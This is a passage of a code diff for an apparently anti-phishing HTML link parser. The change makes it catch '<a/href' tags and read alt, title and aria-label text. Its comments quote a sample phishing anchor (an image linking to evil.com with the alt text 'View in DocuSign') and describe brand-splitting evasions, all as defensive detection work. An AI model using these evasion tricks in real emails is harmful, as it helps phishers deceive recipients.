+    if (tagStart === -1) break;
 
-    const h = m[0].match(hrefAttr);
-    if (!h) continue;
+    // The character after "<a" must be whitespace or '/'. Requiring only
+    // whitespace missed <a/href="..."> — '/' is a valid attribute separator in
+    // HTML5 and clients navigate it fine. Anything else (<abbr>, <article>)
+    // is a different element.
+    const next = scan.charAt(tagStart + 2);
+    if (next !== '/' && !/\s/.test(next))
+    {
+      searchFrom = tagStart + 2;
+      continue;
+    }
 
-    const href = h[1] !== undefined ? h[1] : (h[2] !== undefined ? h[2] : h[3]);
-    if (!href) continue;
+    const tagEnd = findTagEnd(scan, tagStart, LIMITS.maxAnchorTagChars);
+    if (tagEnd === -1) { searchFrom = tagStart + 2; continue; }
 
-    const textStart = openTag.lastIndex;
-    const closeIdx  = scan.indexOf('</a', textStart);
-    // indexOf() itself scans to end-of-document; maxAnchorTextChars caps the
-    // substring we keep, not the search. The overall bound is therefore
+    const tag  = scan.substring(tagStart, tagEnd + 1);
+    const hrefs = extractAttributeValues(tag, 'href');
+    searchFrom  = tagEnd + 1;
+    if (hrefs.length === 0) continue;
+
+    const textStart = tagEnd + 1;
+    const closeIdx  = lower.indexOf('</a', textStart);
+    // indexOf() scans to end-of-document; maxAnchorTextChars caps the substring
+    // we KEEP, not the search. The overall bound is therefore
     // maxAnchorsScanned x maxHtmlScanChars, measured at ~9ms worst case.
-    const cap       = Math.min(textStart + LIMITS.maxAnchorTextChars, scan.length);
-    const textEnd   = (closeIdx === -1 || closeIdx > cap) ? cap : closeIdx;
+    const cap     = Math.min(textStart + LIMITS.maxAnchorTextChars, scan.length);
+    const textEnd = (closeIdx === -1 || closeIdx > cap) ? cap : closeIdx;
+    const innerRaw = scan.substring(textStart, textEnd);
 
-    // Strip nested markup so <span>Docu</span><span>Sign</span> collapses to
-    // "DocuSign" — attackers split brand names across elements. Then decode
-    // entities. Both steps are required before any brand comparison.
-    const inner = scan.substring(textStart, textEnd).replace(/<[^>]{0,2000}>/g, '');
-    const text  = decodeHtmlEntities(inner).replace(/\s+/g, ' ').trim();
+    // Visible text: strip nested markup so <span>Docu</span><span>Sign</span>
+    // collapses to "DocuSign" — attackers split brand names across elements.
+    const visible = decodeHtmlEntities(innerRaw.replace(/<[^>]{0,2000}>/g, ''));
 
-    out.push({ href: decodeHtmlEntities(href), text: text });
+    // Accessible text: alt, title and aria-label, from the anchor's own tag and
+    // from anything nested inside it.
+    //
+    // Without this an image button defeated Signal 7 completely:
+    //     <a href="https://evil.com/"><img alt="View in DocuSign"></a>
+    // There is no text node at all, so the stripper produced an empty string.
+    // This is not an exotic evasion — an image CTA is what real phishing
+    // already uses, because it renders identically and dodges text scanners.
+    // A mail client shows the user "View in DocuSign"; now so do we.
+    const accessible = extractAttributeValues(tag, 'title|aria-label')
+      .concat(extractAttributeValues(innerRaw, 'alt|title|aria-label'))
+      .join(' ');
+
+    const text = (visible + ' ' + accessible).replace(/\s+/g, ' ').trim();
+
+    // A single anchor can legitimately carry several hrefs only if malformed;
+    // judge the first, which is what a client honours.
+    out.push({ href: hrefs[0], text: text });
+
+    if (textEnd > searchFrom) searchFrom = textEnd;
   }
 
   return out;
